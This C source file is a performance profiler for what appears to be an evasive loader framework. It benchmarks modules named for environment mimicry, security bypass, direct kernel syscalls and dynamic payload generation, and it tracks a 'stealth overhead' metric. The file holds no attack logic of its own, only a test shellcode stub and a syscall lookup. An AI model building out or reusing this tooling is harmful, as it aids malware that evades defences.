#include "../include/performance_profiler.h"
#include "../include/cynical_logger.h"
#include "../include/syscalls.h"
#include "../include/utils.h"
#include "../include/mem.h"
#include "../include/dynamic_payload_generator.h"
#include "../include/kernel_direct_syscalls.h"
#include "../include/intelligent_bypass.h"
#include "../include/environment_chameleon.h"

// Define missing status codes and constants
#ifndef STATUS_NOT_READY
#define STATUS_NOT_READY ((NTSTATUS)0xC00000ADL)
#endif

#ifndef ULLONG_MAX
#define ULLONG_MAX 0xFFFFFFFFFFFFFFFFULL
#endif

#ifndef LLONG_MAX
#define LLONG_MAX 0x7FFFFFFFFFFFFFFFLL
#endif

// ========================================================================
// PERFORMANCE PROFILER v1.0 IMPLEMENTATION - "Ultimate Optimization Engine"
// ========================================================================

// Global performance profiler context
PERFORMANCE_PROFILER_CONTEXT g_profiler_ctx = { 0 };

// Internal state
static BOOL g_profiler_initialized = FALSE;
static LARGE_INTEGER g_frequency = { 0 };

// ========================================================================
// UTILITY FUNCTIONS
// ========================================================================

LPCSTR PerformanceProfiler_MetricTypeToString(PERFORMANCE_METRIC_TYPE type) {
    switch (type) {
        case METRIC_EXECUTION_TIME: return "Execution_Time";
        case METRIC_MEMORY_USAGE: return "Memory_Usage";
        case METRIC_CPU_CYCLES: return "CPU_Cycles";
        case METRIC_SYSCALL_FREQUENCY: return "Syscall_Frequency";
        case METRIC_GENERATION_SPEED: return "Generation_Speed";
        case METRIC_STEALTH_OVERHEAD: return "Stealth_Overhead";
        default: return "Unknown";
    }
}

LPCSTR PerformanceProfiler_ModuleToString(PROFILED_MODULE module) {
    switch (module) {
        case MODULE_CYNICAL_LOGGER: return "Cynical_Logger";
        case MODULE_ENVIRONMENT_CHAMELEON: return "Environment_Chameleon";
        case MODULE_INTELLIGENT_BYPASS: return "Intelligent_Bypass";
        case MODULE_KERNEL_SYSCALLS: return "Kernel_Syscalls";
        case MODULE_DYNAMIC_GENERATOR: return "Dynamic_Generator";
        case MODULE_CORE_LOADER: return "Core_Loader";
        default: return "Unknown";
    }
}

DWORD PerformanceProfiler_CalculateScore(
    PPERFORMANCE_METRIC metrics,
    DWORD metric_count
) {
    if (!metrics || metric_count == 0) return 0;
    
    DWORD total_score = 0;
    DWORD valid_metrics = 0;
    
    for (DWORD i = 0; i < metric_count; i++) {
        if (metrics[i].is_active && metrics[i].sample_count > 0) {
            // Simple scoring: lower values are better for time/overhead metrics
            DWORD metric_score = 50; // Base score
            
            if (metrics[i].type == METRIC_EXECUTION_TIME || 
                metrics[i].type == METRIC_STEALTH_OVERHEAD) {
                // Lower is better - penalize high values
                if (metrics[i].value > 1000000) { // > 1ms
                    metric_score = 30;
                } else if (metrics[i].value > 100000) { // > 0.1ms
                    metric_score = 70;
                } else {
                    metric_score = 90;
                }
            } else if (metrics[i].type == METRIC_MEMORY_USAGE) {
                // Memory usage scoring
                if (metrics[i].value > 1024 * 1024) { // > 1MB
                    metric_score = 40;
                } else if (metrics[i].value > 512 * 1024) { // > 512KB
                    metric_score = 70;
                } else {
                    metric_score = 85;
                }
            } else {
                // For frequency metrics, higher might be better
                metric_score = 75;
            }
            
            total_score += metric_score;
            valid_metrics++;
        }
    }
    
    return valid_metrics > 0 ? (total_score / valid_metrics) : 0;
}

// ========================================================================
// CORE API IMPLEMENTATION
// ========================================================================

BOOL PerformanceProfiler_Initialize(OPTIMIZATION_LEVEL opt_level) {
    if (g_profiler_initialized) {
        CynicalLog_Warn("PROFILER", "Performance profiler already initialized");
        return TRUE;
    }
    
    CynicalLog_Info("PROFILER", "Initializing Performance Profiler v1.0 - Ultimate Optimization Engine");
    
    // Clear context
    memset(&g_profiler_ctx, 0, sizeof(PERFORMANCE_PROFILER_CONTEXT));
    
    // Initialize performance counter frequency
    if (!wrapped_NtQueryPerformanceCounter(&g_frequency, NULL)) {
        CynicalLog_Error("PROFILER", "Failed to query performance counter frequency");
        return FALSE;
    }
    
    // Set initial configuration
    g_profiler_ctx.opt_level = opt_level;
    g_profiler_ctx.measurement_interval_ms = 100; // 100ms intervals
    g_profiler_ctx.optimization_threshold = 70; // Optimize if score < 70
    g_profiler_ctx.enable_realtime_optimization = TRUE;
    g_profiler_ctx.enable_memory_tracking = TRUE;
    
    // Initialize timing
    wrapped_NtQuerySystemTime(&g_profiler_ctx.profiling_start_time);
    
    g_profiler_ctx.is_initialized = TRUE;
    g_profiler_ctx.is_active = FALSE;
    g_profiler_initialized = TRUE;
    
    CynicalLog_Info("PROFILER", "Performance profiler initialized - optimization level: %d", opt_level);
    CynicalLog_Info("PROFILER", "Available modules: Logger, Chameleon, Bypass, Kernel, Generator, Loader");
    
    return TRUE;
}

LARGE_INTEGER PerformanceProfiler_StartTiming(VOID) {
    LARGE_INTEGER start_time;
    wrapped_NtQueryPerformanceCounter(&start_time, NULL);
    return start_time;
}

NTSTATUS PerformanceProfiler_EndTiming(
    PROFILED_MODULE module,
    LARGE_INTEGER start_time,
    LPCSTR operation_name
) {
    if (!g_profiler_initialized) {
        return STATUS_NOT_READY;
    }
    
    LARGE_INTEGER end_time;
    wrapped_NtQueryPerformanceCounter(&end_time, NULL);
    
    // Calculate duration in microseconds
    ULONGLONG duration_us = ((end_time.QuadPart - start_time.QuadPart) * 1000000) / g_frequency.QuadPart;
    
    // Record the timing metric
    NTSTATUS status = PerformanceProfiler_RecordMetric(
        module,
        METRIC_EXECUTION_TIME,
        duration_us
    );
    
    if (NT_SUCCESS(status)) {
        CynicalLog_Debug("PROFILER", "Timing recorded for %s.%s: %llu μs", 
                        PerformanceProfiler_ModuleToString(module),
                        operation_name ? operation_name : "operation",
                        duration_us);
    }
    
    return status;
}

NTSTATUS PerformanceProfiler_RecordMetric(
    PROFILED_MODULE module,
    PERFORMANCE_METRIC_TYPE metric_type,
    ULONGLONG value
) {
    if (!g_profiler_initialized) {
        return STATUS_NOT_READY;
    }
    
    // Find existing metric or create new one
    PPERFORMANCE_METRIC metric = NULL;
    
    for (DWORD i = 0; i < g_profiler_ctx.active_metrics_count; i++) {
        if (g_profiler_ctx.metrics[i].module == module &&
            g_profiler_ctx.metrics[i].type == metric_type) {
            metric = &g_profiler_ctx.metrics[i];
            break;
        }
    }
    
    // Create new metric if not found
    if (!metric && g_profiler_ctx.active_metrics_count < 32) {
        metric = &g_profiler_ctx.metrics[g_profiler_ctx.active_metrics_count];
        memset(metric, 0, sizeof(PERFORMANCE_METRIC));
        
        metric->module = module;
        metric->type = metric_type;
        metric->is_active = TRUE;
        metric->min_value = ULLONG_MAX;
        metric->max_value = 0;
        
        g_profiler_ctx.active_metrics_count++;
    }
    
    if (!metric) {
        CynicalLog_Warn("PROFILER", "No space for new metric - limit reached");
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // Update metric
    wrapped_NtQuerySystemTime(&metric->timestamp);
    metric->value = value;
    metric->accumulated_value += value;
    metric->sample_count++;
    
    // Update min/max
    if (value < metric->min_value) {
        metric->min_value = value;
    }
    if (value > metric->max_value) {
        metric->max_value = value;
    }
    
    // Update global statistics
    g_profiler_ctx.total_measurements++;
    
    if (metric_type == METRIC_MEMORY_USAGE) {
        g_profiler_ctx.current_memory_usage = (SIZE_T)value;
        if (value > g_profiler_ctx.peak_memory_usage) {
            g_profiler_ctx.peak_memory_usage = (SIZE_T)value;
        }
    }
    
    CynicalLog_Debug("PROFILER", "Metric recorded: %s.%s = %llu", 
                    PerformanceProfiler_ModuleToString(module),
                    PerformanceProfiler_MetricTypeToString(metric_type),
                    value);
    
    return STATUS_SUCCESS;
}

NTSTATUS PerformanceProfiler_StartProfiling(PROFILED_MODULE module) {
    if (!g_profiler_initialized) {
        return STATUS_NOT_READY;
    }
    
    g_profiler_ctx.is_active = TRUE;
    
    CynicalLog_Info("PROFILER", "Started profiling module: %s", 
                   PerformanceProfiler_ModuleToString(module));
    
    return STATUS_SUCCESS;
}

NTSTATUS PerformanceProfiler_StopProfiling(PROFILED_MODULE module) {
    if (!g_profiler_initialized) {
        return STATUS_NOT_READY;
    }
    
    CynicalLog_Info("PROFILER", "Stopped profiling module: %s", 
                   PerformanceProfiler_ModuleToString(module));
    
    return STATUS_SUCCESS;
}

// ========================================================================
// BENCHMARKING IMPLEMENTATION
// ========================================================================

NTSTATUS Benchmark_Module(
    PROFILED_MODULE module,
    DWORD iterations,
    PBENCHMARK_RESULT result
) {
    if (!result || iterations == 0) {
        return STATUS_INVALID_PARAMETER;
    }
    
    CynicalLog_Info("PROFILER", "Benchmarking module %s with %d iterations", 
                   PerformanceProfiler_ModuleToString(module), iterations);
    
    // Initialize result
    memset(result, 0, sizeof(BENCHMARK_RESULT));
    result->module = module;
    result->test_iterations = iterations;
    
    LARGE_INTEGER total_start = PerformanceProfiler_StartTiming();
    LARGE_INTEGER min_time = { .QuadPart = LLONG_MAX };
    LARGE_INTEGER max_time = { .QuadPart = 0 };
    SIZE_T initial_memory = ResourceMonitor_GetMemoryUsage();
    
    // Run benchmark iterations
    for (DWORD i = 0; i < iterations; i++) {
        LARGE_INTEGER iter_start = PerformanceProfiler_StartTiming();
        
        // Module-specific benchmark operations
        switch (module) {
            case MODULE_CYNICAL_LOGGER:
                CynicalLog_Debug("PROFILER", "Benchmark iteration %d", i);
                break;
                
            case MODULE_DYNAMIC_GENERATOR:
            {
                // Test payload generation
                BYTE test_data[] = { 0x90, 0x90, 0xC3 };
                GENERATED_PAYLOAD test_payload = { 0 };
                DynamicPayload_Generate(test_data, sizeof(test_data), &test_payload);
                DynamicPayload_Free(&test_payload);
                break;
            }
            
            case MODULE_KERNEL_SYSCALLS:
            {
                // Test syscall resolution
                KernelSyscalls_ResolveSyscallId("NtAllocateVirtualMemory");
                break;
            }
            
            default:
                // Generic operation
                wrapped_NtDelayExecution(FALSE, &(LARGE_INTEGER){ .QuadPart = -1000 }); // 0.1ms
                break;
        }
        
        LARGE_INTEGER iter_end;
        wrapped_NtQueryPerformanceCounter(&iter_end, NULL);
        
        LARGE_INTEGER iter_time;
        iter_time.QuadPart = iter_end.QuadPart - iter_start.QuadPart;
        
        if (iter_time.QuadPart < min_time.QuadPart) {
            min_time = iter_time;
        }
        if (iter_time.QuadPart > max_time.QuadPart) {
            max_time = iter_time;
        }
    }
    
    LARGE_INTEGER total_end;
    wrapped_NtQueryPerformanceCounter(&total_end, NULL);
    
    // Calculate results
    result->total_time.QuadPart = total_end.QuadPart - total_start.QuadPart;
    result->average_time.QuadPart = result->total_time.QuadPart / iterations;
    result->min_time = min_time;
    result->max_time = max_time;
    result->peak_memory_usage = ResourceMonitor_GetMemoryUsage() - initial_memory;
    
    // Calculate optimization score
    ULONGLONG avg_time_us = (result->average_time.QuadPart * 1000000) / g_frequency.QuadPart;
    if (avg_time_us < 1000) { // < 1ms
        result->optimization_score = 90;
    } else if (avg_time_us < 10000) { // < 10ms
        result->optimization_score = 75;
    } else if (avg_time_us < 100000) { // < 100ms
        result->optimization_score = 50;
    } else {
        result->optimization_score = 25;
    }
    
    result->benchmark_passed = (result->optimization_score >= g_profiler_ctx.optimization_threshold);
    
    CynicalLog_Info("PROFILER", "Benchmark completed - Module: %s, Score: %d, Avg: %llu μs", 
                   PerformanceProfiler_ModuleToString(module),
                   result->optimization_score,
                   avg_time_us);
    
    return STATUS_SUCCESS;
}

NTSTATUS Benchmark_RunComprehensive(VOID) {
    if (!g_profiler_initialized) {
        return STATUS_NOT_READY;
    }
    
    CynicalLog_Info("PROFILER", "Running comprehensive benchmark suite");
    
    PROFILED_MODULE modules[] = {
        MODULE_CYNICAL_LOGGER,
        MODULE_ENVIRONMENT_CHAMELEON,
        MODULE_INTELLIGENT_BYPASS,
        MODULE_KERNEL_SYSCALLS,
        MODULE_DYNAMIC_GENERATOR,
        MODULE_CORE_LOADER
    };
    
    DWORD module_count = sizeof(modules) / sizeof(modules[0]);
    DWORD passed_benchmarks = 0;
    
    for (DWORD i = 0; i < module_count && g_profiler_ctx.completed_benchmarks < 8; i++) {
        BENCHMARK_RESULT result;
        NTSTATUS status = Benchmark_Module(modules[i], 10, &result); // 10 iterations per module
        
        if (NT_SUCCESS(status)) {
            g_profiler_ctx.benchmark_results[g_profiler_ctx.completed_benchmarks] = result;
            g_profiler_ctx.completed_benchmarks++;
            
            if (result.benchmark_passed) {
                passed_benchmarks++;
            }
            
            PerformanceProfiler_LogBenchmark(&result, "Comprehensive");
        }
    }
    
    CynicalLog_Info("PROFILER", "Comprehensive benchmark completed - %d/%d modules passed", 
                   passed_benchmarks, module_count);
    
    return STATUS_SUCCESS;
}

// ========================================================================
// RESOURCE MONITORING
// ========================================================================

SIZE_T ResourceMonitor_GetMemoryUsage(VOID) {
    // Simple estimation - would use more sophisticated methods in real implementation
    return g_profiler_ctx.current_memory_usage;
}

VOID ResourceMonitor_TrackAllocation(SIZE_T size, PVOID address) {
    if (!g_profiler_initialized) return;
    
    g_profiler_ctx.current_memory_usage += size;
    if (g_profiler_ctx.current_memory_usage > g_profiler_ctx.peak_memory_usage) {
        g_profiler_ctx.peak_memory_usage = g_profiler_ctx.current_memory_usage;
    }
    
    PerformanceProfiler_RecordMetric(MODULE_CORE_LOADER, METRIC_MEMORY_USAGE, g_profiler_ctx.current_memory_usage);
}

VOID ResourceMonitor_TrackDeallocation(SIZE_T size, PVOID address) {
    if (!g_profiler_initialized) return;
    
    if (g_profiler_ctx.current_memory_usage >= size) {
        g_profiler_ctx.current_memory_usage -= size;
    }
    
    PerformanceProfiler_RecordMetric(MODULE_CORE_LOADER, METRIC_MEMORY_USAGE, g_profiler_ctx.current_memory_usage);
}

NTSTATUS ResourceMonitor_Update(VOID) {
    if (!g_profiler_initialized) {
        return STATUS_NOT_READY;
    }
    
    // Update execution time
    LARGE_INTEGER current_time;
    wrapped_NtQuerySystemTime(&current_time);
    g_profiler_ctx.total_execution_time.QuadPart = 
        current_time.QuadPart - g_profiler_ctx.profiling_start_time.QuadPart;
    
    return STATUS_SUCCESS;
}

// ========================================================================
// LOGGING FUNCTIONS
// ========================================================================

VOID PerformanceProfiler_LogMetric(
    PROFILED_MODULE module,
    PERFORMANCE_METRIC_TYPE metric_type,
    ULONGLONG value,
    LPCSTR context
) {
    CynicalLog_Debug("PROFILER", "Metric - %s.%s: %llu (%s)",
                    PerformanceProfiler_ModuleToString(module),
                    PerformanceProfiler_MetricTypeToString(metric_type),
                    value,
                    context ? context : "");
}

VOID PerformanceProfiler_LogBenchmark(
    PBENCHMARK_RESULT result,
    LPCSTR test_name
) {
    if (!result) return;
    
    ULONGLONG avg_time_us = (result->average_time.QuadPart * 1000000) / g_frequency.QuadPart;
    
    CynicalLog_Info("PROFILER", "Benchmark %s - Module: %s, Iterations: %d, Avg: %llu μs, Score: %d",
                   test_name ? test_name : "Unknown",
                   PerformanceProfiler_ModuleToString(result->module),
                   result->test_iterations,
                   avg_time_us,
                   result->optimization_score);
}

VOID PerformanceProfiler_GenerateSummary(VOID) {
    if (!g_profiler_initialized) return;
    
    CynicalLog_Info("PROFILER", "=== PERFORMANCE PROFILER FINAL SUMMARY ===");
    CynicalLog_Info("PROFILER", "Active metrics: %d", g_profiler_ctx.active_metrics_count);
    CynicalLog_Info("PROFILER", "Total measurements: %d", g_profiler_ctx.total_measurements);
    CynicalLog_Info("PROFILER", "Completed benchmarks: %d", g_profiler_ctx.completed_benchmarks);
    CynicalLog_Info("PROFILER", "Current memory usage: %zu bytes", g_profiler_ctx.current_memory_usage);
    CynicalLog_Info("PROFILER", "Peak memory usage: %zu bytes", g_profiler_ctx.peak_memory_usage);
    CynicalLog_Info("PROFILER", "Total syscalls: %d", g_profiler_ctx.total_syscalls);
    CynicalLog_Info("PROFILER", "Direct syscalls: %d", g_profiler_ctx.direct_syscalls);
    
    // Calculate overall performance score
    DWORD overall_score = PerformanceProfiler_CalculateScore(
        g_profiler_ctx.metrics,
        g_profiler_ctx.active_metrics_count
    );
    
    CynicalLog_Info("PROFILER", "Overall performance score: %d/100", overall_score);
    
    if (overall_score >= 80) {
        CynicalLog_Info("PROFILER", "Performance status: EXCELLENT - System optimized");
    } else if (overall_score >= 60) {
        CynicalLog_Info("PROFILER", "Performance status: GOOD - Minor optimizations possible");
    } else if (overall_score >= 40) {
        CynicalLog_Info("PROFILER", "Performance status: AVERAGE - Optimizations recommended");
    } else {
        CynicalLog_Warn("PROFILER", "Performance status: POOR - Major optimizations needed");
    }
    
    CynicalLog_Info("PROFILER", "=== END PERFORMANCE SUMMARY ===");
}

NTSTATUS PerformanceReporter_GenerateReport(VOID) {
    if (!g_profiler_initialized) {
        return STATUS_NOT_READY;
    }
    
    CynicalLog_Info("PROFILER", "Generating comprehensive performance report");
    
    // Generate summary
    PerformanceProfiler_GenerateSummary();
    
    // Log individual metrics
    for (DWORD i = 0; i < g_profiler_ctx.active_metrics_count; i++) {
        PPERFORMANCE_METRIC metric = &g_profiler_ctx.metrics[i];
        if (metric->is_active && metric->sample_count > 0) {
            ULONGLONG avg_value = metric->accumulated_value / metric->sample_count;
            
            CynicalLog_Info("PROFILER", "Metric details - %s.%s: Avg=%llu, Min=%llu, Max=%llu, Samples=%d",
                           PerformanceProfiler_ModuleToString(metric->module),
                           PerformanceProfiler_MetricTypeToString(metric->type),
                           avg_value,
                           metric->min_value,
                           metric->max_value,
                           metric->sample_count);
        }
    }
    
    // Log benchmark results
    for (DWORD i = 0; i < g_profiler_ctx.completed_benchmarks; i++) {
        PerformanceProfiler_LogBenchmark(&g_profiler_ctx.benchmark_results[i], "Final");
    }
    
    return STATUS_SUCCESS;
}

// ========================================================================
// MODULE PROFILING
// ========================================================================

NTSTATUS ModuleProfiler_ProfileAll(VOID) {
    CynicalLog_Info("PROFILER", "Profiling all modules");
    return Benchmark_RunComprehensive();
}

NTSTATUS ModuleProfiler_ProfileModule(
    PROFILED_MODULE module,
    PBENCHMARK_RESULT result
) {
    return Benchmark_Module(module, 20, result); // 20 iterations for detailed profiling
}

// ========================================================================
// CLEANUP
// ========================================================================

VOID PerformanceProfiler_Cleanup(VOID) {
    if (!g_profiler_initialized) return;
    
    CynicalLog_Info("PROFILER", "Cleaning up Performance Profiler");
    
    // Generate final report
    PerformanceReporter_GenerateReport();
    
    // Clear context
    memset(&g_profiler_ctx, 0, sizeof(PERFORMANCE_PROFILER_CONTEXT));
    
    g_profiler_initialized = FALSE;
    
    CynicalLog_Info("PROFILER", "Performance Profiler cleanup completed");
} 